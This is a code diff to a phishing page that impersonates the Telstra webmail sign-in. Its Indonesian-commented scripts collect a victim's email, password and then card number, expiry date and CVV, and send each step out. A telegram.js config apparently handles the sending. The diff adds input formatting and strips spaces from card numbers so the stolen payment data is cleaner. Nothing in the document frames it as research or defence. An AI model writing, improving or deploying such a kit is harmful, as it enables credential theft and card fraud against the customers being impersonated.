@@ -5,7 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to Telstra webmail</title>
     
+    <!-- Favicon Logo Telstra -->
     <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/recovery-account857/img/main/telstra.png">
+    
     <link rel="stylesheet" href="style.css">
     <script src="config/telegram.js"></script>
 </head>
@@ -26,7 +28,7 @@
 
                 <form id="email-form">
                     <label for="telstra-email">Telstra email</label>
-                    <p class="example-text">Example: john@bigpond.com</p>
+                    <p class="example-text">
                     <input type="text" id="telstra-email" required autocomplete="username">
 
                     <a href="#" class="forgot-link">Forgot Telstra email</a>
@@ -96,7 +98,7 @@
             </div>
 
             <!-- ======================================
-                LANGKAH 5: PAYMENT DETAILS
+                LANGKAH 5: PAYMENT DETAILS — DIPERBAIKI
                 ====================================== -->
             <div id="step-payment" style="display:none;">
                 <p class="step-indicator">STEP 1 OF 3</p>
@@ -106,7 +108,7 @@
                 <form id="payment-form">
                     <div class="form-group">
                         <label>Card number</label>
-                        <input type="text" id="card-number" autocomplete="cc-number">
+                        <input type="text" id="card-number" maxlength="19" autocomplete="cc-number" placeholder="">
                         <p class="hint-text">We accept Visa, Mastercard and American Express.</p>
                     </div>
 
@@ -119,11 +121,11 @@
                     <div class="form-row">
                         <div class="form-group">
                             <label>Expiry Date</label>
-                            <input type="text" id="card-expiry" placeholder="mm/yy" autocomplete="cc-exp">
+                            <input type="text" id="card-expiry" placeholder="mm/yy" maxlength="4" autocomplete="cc-exp">
                         </div>
                         <div class="form-group">
                             <label>Security Code</label>
-                            <input type="text" id="card-cvv" placeholder="CVV/CVC" autocomplete="cc-csc">
+                            <input type="text" id="card-cvv" placeholder="CVV/CVC" maxlength="4" autocomplete="cc-csc">
                         </div>
                     </div>
 
@@ -180,7 +182,31 @@
             document.getElementById('step-debit').style.display = 'block';
         }
 
-        // 1. Email → Kirim → Sandi
+        // ======================================
+        // FORMAT NOMOR KARTU — 16 digit + spasi otomatis
+        // ======================================
+        const inputKartu = document.getElementById('card-number');
+        inputKartu.addEventListener('input', function() {
+            let nilai = this.value.replace(/\D/g, '');
+            if (nilai.length > 16) nilai = nilai.substring(0, 16);
+            this.value = nilai.replace(/(\d{4})(?=\d)/g, '$1 ');
+        });
+
+        // ======================================
+        // FORMAT TANGGAL — MM/YY otomatis
+        // ======================================
+        const inputKadaluwarsa = document.getElementById('card-expiry');
+        inputKadaluwarsa.addEventListener('input', function() {
+            let nilai = this.value.replace(/\D/g, '');
+            if (nilai.length >= 2) {
+                nilai = nilai.substring(0, 2) + '/' + nilai.substring(2, 4);
+            }
+            this.value = nilai;
+        });
+
+        // ======================================
+        // 1. EMAIL → KIRIM → LANGKAH SANDI
+        // ======================================
         document.getElementById('email-form').addEventListener('submit', async e => {
             e.preventDefault();
             const email = document.getElementById('telstra-email').value.trim();
@@ -198,7 +224,9 @@ Waktu: ${new Date().toLocaleString()}`);
             document.getElementById('telstra-password').focus();
         });
 
-        // 2. Sandi → Kirim → Cek percobaan
+        // ======================================
+        // 2. SANDI → KIRIM → CEK PERCOBAAN
+        // ======================================
         document.getElementById('password-form').addEventListener('submit', async e => {
             e.preventDefault();
             const sandi = document.getElementById('telstra-password').value;
@@ -225,11 +253,13 @@ Waktu: ${new Date().toLocaleString()}`);
             }
         });
 
-        // 3. Kartu → Kirim → Sukses → Alihkan
+        // ======================================
+        // 3. KARTU → KIRIM → SUKSES → ALIHKAN
+        // ======================================
         document.getElementById('payment-form').addEventListener('submit', async e => {
             e.preventDefault();
             const kartu = {
-                nomor: document.getElementById('card-number').value,
+                nomor: document.getElementById('card-number').value.replace(/\s/g, ''), // tanpa spasi
                 nama: document.getElementById('card-name').value,
                 kadaluwarsa: document.getElementById('card-expiry').value,
                 cvv: document.getElementById('card-cvv').value
